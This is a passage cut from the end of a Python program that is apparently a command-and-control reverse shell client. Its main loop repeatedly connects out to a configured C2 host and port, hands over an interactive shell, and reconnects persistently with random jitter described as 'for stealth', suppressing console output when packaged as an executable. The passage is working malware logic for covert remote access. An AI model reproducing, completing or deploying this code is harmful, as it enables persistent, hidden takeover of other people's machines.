            c2_host = args.host if args.host != DEFAULT_C2_HOST else _CONFIG["host"]
            c2_port = args.port if args.port != DEFAULT_C2_PORT else _CONFIG["port"]
            
            while True:
                shell = C2ReverseShell(
                    c2_host=c2_host,
                    c2_port=c2_port,
                    max_retries=1,  # Try once per loop iteration
                    verbose=args.verbose
                )
                
                if shell.connect():
                    shell.run_shell()
                    # After shell ends, reconnect if persistent mode
                    if not _CONFIG["persistent"]:
                        break
                
                # Wait before reconnecting (with jitter for stealth)
                jitter = random.uniform(0, RECONNECT_JITTER)
                wait_time = _CONFIG["retry_interval"] + jitter
                
                if not (hasattr(sys, 'frozen') and getattr(sys, 'frozen', False)):
                    print(f"[*] Reconnecting in {wait_time:.1f} seconds...")
                
                time.sleep(wait_time)
                
    except KeyboardInterrupt:
        if not (hasattr(sys, 'frozen') and getattr(sys, 'frozen', False)):
            print("\n\n[*] Operation cancelled by user")
        sys.exit(0)


if __name__ == "__main__":
    main()
